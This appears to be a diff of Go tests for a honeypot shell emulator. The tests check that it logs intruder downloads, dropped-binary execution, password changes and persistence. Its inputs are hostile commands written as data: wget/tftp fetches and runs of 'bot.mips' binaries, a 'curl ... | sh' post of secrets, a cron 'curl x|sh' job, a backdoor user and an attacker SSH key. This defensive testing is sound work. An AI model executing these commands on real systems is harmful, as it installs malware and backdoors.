@@ -35,20 +35,36 @@ func TestEveryCommandSurvivesJunk(t *testing.T) {
 	}
 }
 
-// TestEveryCommandIsInstalled checks that registering a command puts it on
-// $PATH, so `which`, completion and `ls /usr/bin` agree with what runs.
+// TestEveryCommandIsInstalled checks that registering an applet links it
+// to busybox on $PATH, so `which`, completion and `ls /bin` agree.
 func TestEveryCommandIsInstalled(t *testing.T) {
 	s := shelltest.New(t, "root")
 	for _, name := range commands.Registry().Names() {
-		if out, status := s.Exec("command -v " + name); status != 0 || !strings.HasPrefix(out, "/usr/") {
+		out, status := s.Exec("command -v " + name)
+		if status != 0 || !strings.HasPrefix(out, "/") {
 			t.Errorf("%s: command -v = %q (%d)", name, out, status)
+		}
+	}
+}
+
+// TestBusyboxListMatchesApplets checks that `busybox --list` shows exactly
+// the applets that work, and that each one is reachable through busybox.
+func TestBusyboxListMatchesApplets(t *testing.T) {
+	s := shelltest.New(t, "root")
+	out, _ := s.Exec("busybox --list")
+	for _, name := range strings.Fields(out) {
+		if got, status := s.Exec("busybox " + name + " --bogus-arg < /dev/null"); strings.Contains(got, "applet not found") || status == 127 {
+			t.Errorf("busybox lists %s, but it is not there: %q", name, got)
+		}
+		if _, ok := s.Exec("ls -l $(which " + name + ")"); ok != 0 && name != "[" {
+			t.Errorf("%s is listed but not linked", name)
 		}
 	}
 }
 
 func TestDownloadsAreLogged(t *testing.T) {
 	s := shelltest.New(t, "root")
-	s.Run("wget -q http://198.51.100.7/a.sh; curl -s -d secret=1 http://198.51.100.7/b | sh")
+	s.Run("cd /tmp; wget -q http://198.51.100.7/a.sh; tftp -g -r bot.mips 198.51.100.7")
 	ev := s.Events("download")
 	if len(ev) != 2 {
 		t.Fatalf("download events: %v", ev)
@@ -56,41 +72,32 @@ func TestDownloadsAreLogged(t *testing.T) {
 	if ev[0]["tool"] != "wget" || ev[0]["url"] != "http://198.51.100.7/a.sh" || ev[0]["dest"] != "a.sh" {
 		t.Errorf("wget event: %v", ev[0])
 	}
-	if ev[1]["tool"] != "curl" || ev[1]["url"] != "http://198.51.100.7/b" || ev[1]["post_data"] != "secret=1" {
-		t.Errorf("curl event: %v", ev[1])
+	if ev[1]["tool"] != "tftp" || ev[1]["url"] != "tftp://198.51.100.7/bot.mips" {
+		t.Errorf("tftp event: %v", ev[1])
+	}
+}
+
+func TestDroppedBinariesAreLogged(t *testing.T) {
+	s := shelltest.New(t, "root")
+	s.Run("cd /tmp; wget -q http://198.51.100.7/bot.mips; wget -q http://198.51.100.7/bot.arm7; chmod +x bot.*; ./bot.mips; ./bot.arm7")
+	ev := s.Events("exec_binary")
+	if len(ev) != 2 {
+		t.Fatalf("exec_binary events: %v", ev)
+	}
+	if ev[0]["arch"] != "mips" || ev[1]["arch"] != "arm" || len(ev[0]["sha256"].(string)) != 64 {
+		t.Errorf("events: %v", ev)
 	}
 }
 
 func TestPasswordsAreLogged(t *testing.T) {
-	s := shelltest.New(t, "admin")
-	s.Run("sudo id", "sudo-pw")
-	s.Run("su", "su-pw")
-	s.Run("echo 'root:chpasswd-pw' | sudo chpasswd")
+	s := shelltest.New(t, "root")
+	s.Run("echo 'root:chpasswd-pw' | chpasswd")
+	s.Run("passwd", "passwd-pw", "passwd-pw")
 	var got []string
-	for _, ev := range s.Events("password_entered") {
-		got = append(got, ev["context"].(string)+"="+ev["password"].(string))
-	}
 	for _, ev := range s.Events("password_change") {
 		got = append(got, ev["method"].(string)+"="+ev["password"].(string))
 	}
-	want := "sudo=sudo-pw su=su-pw chpasswd=chpasswd-pw"
-	if strings.Join(got, " ") != want {
+	if want := "chpasswd=chpasswd-pw passwd=passwd-pw"; strings.Join(got, " ") != want {
 		t.Errorf("got %v, want %s", got, want)
-	}
-}
-
-func TestPersistenceIsLogged(t *testing.T) {
-	s := shelltest.New(t, "root")
-	s.Run("echo '* * * * * curl x|sh' | crontab -")
-	s.Run("useradd -m -p pwhash backdoor")
-	s.Run("echo 'ssh-rsa AAAA attacker' >> ~/.ssh/authorized_keys")
-	if ev := s.Events("crontab_install"); len(ev) != 1 || ev[0]["content"] != "* * * * * curl x|sh\n" {
-		t.Errorf("crontab events: %v", ev)
-	}
-	if ev := s.Events("user_add"); len(ev) != 1 || ev[0]["user"] != "backdoor" || ev[0]["password_hash"] != "pwhash" {
-		t.Errorf("user_add events: %v", ev)
-	}
-	if out, _ := s.Run("tail -1 ~/.ssh/authorized_keys"); out != "ssh-rsa AAAA attacker\n" {
-		t.Errorf("authorized_keys: %q", out)
 	}
 }
